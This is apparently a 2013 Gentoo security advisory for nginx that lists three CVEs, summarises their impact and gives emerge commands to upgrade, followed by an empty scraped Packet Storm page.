Multiple vulnerabilities have been discovered in nginx. Please review
the CVE identifiers referenced below for details.

### Impact

A remote attacker could send a specially crafted request, possibly
resulting in execution of arbitrary code with the privileges of the
process, or a Denial of Service condition. Furthermore, a
context-dependent attacker may be able to obtain sensitive information.

### Workaround

There is no known workaround at this time.

### Resolution

All nginx users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-servers/nginx-1.4.1-r2"

```
### References

* [CVE-2013-0337](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2013-0337)
* [CVE-2013-2028](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2013-2028)
* [CVE-2013-2070](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2013-2070)

**Release date**

October 06, 2013

**Latest revision**

October 06, 2013: 1

**Severity**

normal

**Exploitable**

local, remote

**Bugzilla entries**

* [458726](https://bugs.gentoo.org/show_bug.cgi?id=458726)
* [468870](https://bugs.gentoo.org/show_bug.cgi?id=468870)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from packetstormsecurity.com_ce5240aa_20250125_014417.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


